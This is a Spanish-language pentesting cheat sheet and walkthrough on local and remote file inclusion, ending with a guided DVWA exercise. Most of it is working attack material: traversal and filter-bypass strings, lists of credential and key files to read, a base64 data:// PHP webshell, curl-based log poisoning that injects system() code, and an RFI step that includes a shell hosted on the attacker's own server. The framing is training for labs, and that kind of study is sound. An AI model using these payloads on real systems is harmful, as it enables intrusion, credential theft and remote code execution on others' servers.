# LFI / RFI (Local & Remote File Inclusion)

**File Inclusion** ocurre cuando una web incluye un archivo cuyo nombre controla el usuario, sin validarlo. Permite **leer archivos del servidor** (LFI), y en ciertos casos **ejecutar código** (RCE). Si el archivo se carga desde una URL externa, es **RFI**.

---

## Cómo se ve

Un parámetro que carga una página/plantilla:

```text
http://<IP>/index.php?page=home
http://<IP>/?file=about.php
http://<IP>/view?lang=es
```

Prueba a cambiarlo por una ruta del sistema:

```text
http://<IP>/index.php?page=/etc/passwd
http://<IP>/index.php?page=../../../../etc/passwd
```

Si ves el contenido de `/etc/passwd` → **LFI**.

---

## Path traversal y bypass de filtros

```text
../../../../etc/passwd
....//....//....//etc/passwd        (bypass de filtro "../")
..%2f..%2f..%2fetc%2fpasswd         (URL-encoding)
%252e%252e%252f                      (doble encoding)
/etc/passwd%00                       (null byte, PHP < 5.3.4)
....\/....\/etc/passwd
```

Si el código añade una extensión (`page . ".php"`), prueba el null byte (versiones antiguas) o el truco de truncamiento.

---

## Archivos interesantes para leer

**Linux:**
```text
/etc/passwd                 # usuarios
/etc/shadow                 # hashes (si hay permiso)
/etc/hosts
/var/www/html/config.php    # credenciales de la app
/home/<user>/.ssh/id_rsa    # clave privada -> SSH
/proc/self/environ          # variables de entorno
/var/log/apache2/access.log # para log poisoning (ver abajo)
```

**Windows:**
```text
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\inetpub\wwwroot\web.config
C:\xampp\apache\conf\httpd.conf
```

---

## De LFI a RCE

### 1. Wrappers de PHP

Leer el código fuente PHP en base64 (no se ejecuta, se ve):

```text
php://filter/convert.base64-encode/resource=config.php
```

Ejecutar código directamente:

```text
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==
php://input   (con el payload PHP en el cuerpo POST)
expect://id   (si la extensión expect está activa)
```

### 2. Log Poisoning

Si puedes leer un log (p.ej. `access.log`) vía LFI, "envenénalo" con PHP a través de la cabecera User-Agent, y luego inclúyelo:

```bash
curl "http://<IP>/" -A "<?php system(\$_GET['c']); ?>"
# luego:
curl "http://<IP>/index.php?page=/var/log/apache2/access.log&c=id"
```

### 3. PHP Session / otros

Envenenar `/tmp/sess_<id>`, logs de SSH (`/var/log/auth.log` con un usuario malicioso), logs de correo, etc.

> **Consejo:** siempre que tengas LFI, intenta primero `php://filter` para **leer el código fuente** de la aplicación. Ahí encontrarás credenciales de BD, rutas y lógica que te abren el siguiente paso, incluso si no logras RCE directo.

---

## RFI (Remote File Inclusion)

Si `allow_url_include=On` (poco común hoy), puedes incluir una shell desde tu servidor:

```text
http://<IP>/index.php?page=http://<TU_IP>/shell.txt
```

```bash
# En tu máquina sirviendo shell.txt con <?php system($_GET['c']); ?>
python3 -m http.server 80
```

---

## Herramientas relacionadas

| Herramienta | Descripción |
| ----------- | ----------- |
| `ffuf` / Burp Intruder | Fuzzear parámetros y payloads de traversal. |
| `LFISuite` / `liffy` | Automatizar explotación de LFI a RCE. |
| `wfuzz` | Descubrir el nº de `../` necesarios. |
| PayloadsAllTheThings | Colección de wrappers y bypass. |

---

> **Consejo:** detecta con `/etc/passwd`, confirma el nivel de `../` que hace falta, y luego sube el nivel: `php://filter` para leer código, y log poisoning / wrappers para RCE. Un LFI "solo de lectura" ya es crítico si te deja leer una `id_rsa` o un `config.php` con credenciales.

---

## Dónde practicar LFI / RFI

| Recurso | Tipo | Enlace |
| ------- | ---- | ------ |
| PortSwigger Academy — Path traversal | Labs gratis | https://portswigger.net/web-security/file-path-traversal |
| DVWA — File Inclusion | Descargable (Docker) | https://github.com/digininja/DVWA |
| TryHackMe — "File Inclusion" | Sala guiada | https://tryhackme.com |
| VulnHub / DockerLabs | Máquinas completas | https://www.vulnhub.com · https://dockerlabs.es |

## Writeup guiado: LFI en DVWA (nivel Low)

```flow
Preparar :: DVWA en Docker, seguridad "low", sección File Inclusion.
Leer ficheros :: Path traversal hacia /etc/passwd.
Ver código :: Wrapper php://filter en base64.
Hacia RCE :: Log poisoning / data:// según el entorno.
```

### Paso 1 — Preparar

En DVWA (seguridad **Low**) ve a **File Inclusion**. La URL incluye un archivo según el parámetro `page`: `.../?page=include.php`.

### Paso 2 — Leer archivos del sistema

```text
?page=/etc/passwd
?page=../../../../../../etc/passwd
```

Ves el contenido de `/etc/passwd` → LFI confirmada.

### Paso 3 — Leer el código fuente (wrapper PHP)

```text
?page=php://filter/convert.base64-encode/resource=../../index.php
```

Copias el base64, lo decodificas y tienes el **código fuente** (con credenciales y rutas).

### Paso 4 — Hacia RCE

```text
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==
&c=id
```

O envenena un log (`/var/log/apache2/access.log`) con PHP en el User-Agent y luego inclúyelo. Detalle completo en la teoría de arriba.

> **Consejo:** `php://filter` para leer código fuente es el primer reflejo ante un LFI: aunque no logres RCE, el código te regala el siguiente paso. En DVWA Medium/High practica el bypass de filtros de `../` y de rutas.
